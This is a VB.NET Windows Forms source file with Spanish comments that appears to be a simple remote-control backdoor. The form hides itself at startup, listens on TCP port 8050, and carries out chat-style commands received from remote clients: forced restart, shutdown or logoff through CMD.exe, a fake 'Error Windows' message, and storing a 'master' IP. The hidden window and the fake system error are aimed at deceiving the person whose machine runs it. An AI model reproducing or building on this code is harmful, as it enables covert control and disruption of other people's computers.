Imports System
Imports System.Threading
Imports System.Net.Sockets
Imports System.IO
Imports System.Text

Public Class Form8
    Inherits System.Windows.Forms.Form

    Dim TEXTOCLIENTE As String
    Dim TEXTOMENSAJE As String


    ' " Código generado por el Diseñador de Windows Forms "



    Dim WithEvents WinSockServer As New WinSockServer()

    Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As FormClosingEventArgs) Handles Me.FormClosing
        End
    End Sub





    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Me.Hide()
        Timer1.Start()
        With WinSockServer

            'Establezco el puerto donde escuchar

            .PuertoDeEscucha = 8050



            'Comienzo la escucha

            .Escuchar()

        End With

    End Sub

    Private Sub WinSockServer_DatosRecibidos(ByVal IDTerminal As System.Net.IPEndPoint) Handles WinSockServer.DatosRecibidos
        TEXTOCLIENTE = WinSockServer.ObtenerDatos(IDTerminal)
    End Sub

    Private Sub Button3_Click(ByVal sender As Object, ByVal e As EventArgs) Handles Button3.Click
        WindowState = FormWindowState.Minimized
    End Sub

    Private Sub RELOJ_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles RELOJ.Tick
        If TEXTOCLIENTE <> "" Then
            CHAT.SelectionColor = Color.Black
            CHAT.SelectedText = TEXTOCLIENTE
            TEXTOCLIENTE = ""
        End If
    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        Try
            If CHAT.Text <> "" Then
                If CHAT.Text = "#reiniciar" Then
                    Process.Start("CMD.exe", "/C shutdown /r /t 60")
                    CHAT.Clear()
                End If
                If CHAT.Text = "#apagar" Then
                    Process.Start("CMD.exe", "/C shutdown /s /f /t 60")
                    CHAT.Clear()
                End If
                If CHAT.Text = "#nullshut" Then
                    Process.Start("CMD.exe", "/C shutdown /a")
                    CHAT.Clear()
                End If
                If CHAT.Text = "#SesionOff" Then
                    Process.Start("CMD.exe", "/C shutdown /l /f /t 60")
                    CHAT.Clear()
                End If
                If CHAT.Text = "#msgErr" Then
                    MsgBox("Windows no ah podido recuperarse de un error en el sistema", MsgBoxStyle.Critical, "Error Windows")
                End If
                If (CHAT.TextLength < 28) Then
                    Dim aString As String = CHAT.Text
                    Dim bString As String
                    Dim cString As String
                    Dim tamaño As Integer = CHAT.TextLength
                    bString = aString.Substring(0, 9)
                    If bString = "#ipmaster" Then
                        If tamaño = 22 Then
                            cString = aString.Substring(10, 12)
                            CHAT.Clear()
                        End If
                        If tamaño = 23 Then
                            cString = aString.Substring(10, 13)
                            CHAT.Clear()
                        End If
                        If tamaño = 24 Then
                            cString = aString.Substring(10, 14)
                            CHAT.Clear()
                        End If
                        If tamaño = 25 Then
                            cString = aString.Substring(10, 15)
                            CHAT.Clear()
                        End If
                        My.Settings.ipmaster = cString
                        CHAT.Clear()
                    End If
                End If
               
                If CHAT.Text = "#webview" Then
                    Form6.Show()
                    CHAT.Clear()
                End If
                CHAT.Clear()

            Else

            End If
        Catch ex As Exception
        End Try
    End Sub
End Class

Public Class WinSockServer



#Region "ESTRUCTURAS"

    Private Structure InfoDeUnCliente

        'Esta estructura permite guardar la información sobre un cliente



        Public Socket As Socket 'Socket utilizado para mantener la conexion con el cliente

        Public Thread As Thread 'Thread utilizado para escuchar al cliente

        Public UltimosDatosRecibidos As String 'Ultimos datos enviados por el cliente

    End Structure

#End Region



#Region "VARIABLES"

    Private tcpLsn As TcpListener

    Private Clientes As New Hashtable() 'Aqui se guarda la informacion de todos los clientes conectados

    Private tcpThd As Thread

    Private IDClienteActual As Net.IPEndPoint 'Ultimo cliente conectado

    Private m_PuertoDeEscucha As String

#End Region



#Region "EVENTOS"

    Public Event NuevaConexion(ByVal IDTerminal As Net.IPEndPoint)

    Public Event DatosRecibidos(ByVal IDTerminal As Net.IPEndPoint)

    Public Event ConexionTerminada(ByVal IDTerminal As Net.IPEndPoint)

#End Region



#Region "PROPIEDADES"

    Property PuertoDeEscucha() As String

        Get

            PuertoDeEscucha = m_PuertoDeEscucha

        End Get



        Set(ByVal Value As String)

            m_PuertoDeEscucha = Value

        End Set

    End Property

#End Region
#Region "METODOS"



    Public Sub Escuchar()

        tcpLsn = New TcpListener(PuertoDeEscucha)


        'Inicio la escucha

        tcpLsn.Start()



        'Creo un thread para que se quede escuchando la llegada de un cliente

        tcpThd = New Thread(AddressOf EsperarCliente)

        tcpThd.Start()

    End Sub



    Public Function ObtenerDatos(ByVal IDCliente As Net.IPEndPoint) As String

        Dim InfoClienteSolicitado As InfoDeUnCliente



        'Obtengo la informacion del cliente solicitado

        InfoClienteSolicitado = Clientes(IDCliente)



        ObtenerDatos = InfoClienteSolicitado.UltimosDatosRecibidos

    End Function



    Public Sub Cerrar(ByVal IDCliente As Net.IPEndPoint)

        Dim InfoClienteActual As InfoDeUnCliente



        'Obtengo la informacion del cliente solicitado

        InfoClienteActual = Clientes(IDCliente)



        'Cierro la conexion con el cliente

        InfoClienteActual.Socket.Close()

    End Sub



    Public Sub Cerrar()

        Dim InfoClienteActual As InfoDeUnCliente



        'Recorro todos los clientes y voy cerrando las conexiones

        For Each InfoClienteActual In Clientes.Values

            Call Cerrar(InfoClienteActual.Socket.RemoteEndPoint)

        Next

    End Sub
    Public Sub EnviarDatos(ByVal IDCliente As Net.IPEndPoint, ByVal Datos As String)

        Dim Cliente As InfoDeUnCliente



        'Obtengo la informacion del cliente al que se le quiere enviar el mensaje

        Cliente = Clientes(IDCliente)



        'Le envio el mensaje

        Cliente.Socket.Send(Encoding.ASCII.GetBytes(Datos))

    End Sub



    Public Sub EnviarDatos(ByVal Datos As String)

        Dim Cliente As InfoDeUnCliente



        'Recorro todos los clientes conectados, y les envio el mensaje recibido

        'en el parametro Datos

        For Each Cliente In Clientes.Values

            EnviarDatos(Cliente.Socket.RemoteEndPoint, Datos)

        Next

    End Sub



#End Region
#Region "FUNCIONES PRIVADAS"

    Private Sub EsperarCliente()

        Dim InfoClienteActual As InfoDeUnCliente



        With InfoClienteActual



            While True
                .Socket = tcpLsn.AcceptSocket() 
                IDClienteActual = .Socket.RemoteEndPoint

                .Thread = New Thread(AddressOf LeerSocket)

                SyncLock Me
                    Clientes.Add(IDClienteActual, InfoClienteActual)
                End SyncLock


                RaiseEvent NuevaConexion(IDClienteActual)
                .Thread.Start()

            End While



        End With



    End Sub
    Private Sub LeerSocket()

        Dim IDReal As Net.IPEndPoint 'ID del cliente que se va a escuchar
        Dim Recibir() As Byte 'Array utilizado para recibir los datos que llegan
        Dim InfoClienteActual As InfoDeUnCliente 'Informacion del cliente que se va escuchar
        Dim Ret As Integer = 0
        IDReal = IDClienteActual

        InfoClienteActual = Clientes(IDReal)



        With InfoClienteActual



            While True

                If .Socket.Connected Then

                    Recibir = New Byte(100) {}



                    Try


                        Ret = .Socket.Receive(Recibir, Recibir.Length, SocketFlags.None)



                        If Ret > 0 Then


                            .UltimosDatosRecibidos = Encoding.ASCII.GetString(Recibir)

                            Clientes(IDReal) = InfoClienteActual
                            RaiseEvent DatosRecibidos(IDReal)

                        Else

                            RaiseEvent ConexionTerminada(IDReal)

                            Exit While

                        End If



                    Catch e As Exception

                        If Not .Socket.Connected Then

                            'Genero el evento de la finalizacion de la conexion

                            RaiseEvent ConexionTerminada(IDReal)

                            Exit While

                        End If

                    End Try

                End If

            End While



            Call CerrarThread(IDReal)

        End With

    End Sub
    Private Sub CerrarThread(ByVal IDCliente As Net.IPEndPoint)

        Dim InfoClienteActual As InfoDeUnCliente

        InfoClienteActual = Clientes(IDCliente)
        Try

            InfoClienteActual.Thread.Abort()



        Catch e As Exception

            SyncLock Me

                Clientes.Remove(IDCliente)

            End SyncLock

        End Try


    End Sub


#End Region



End Class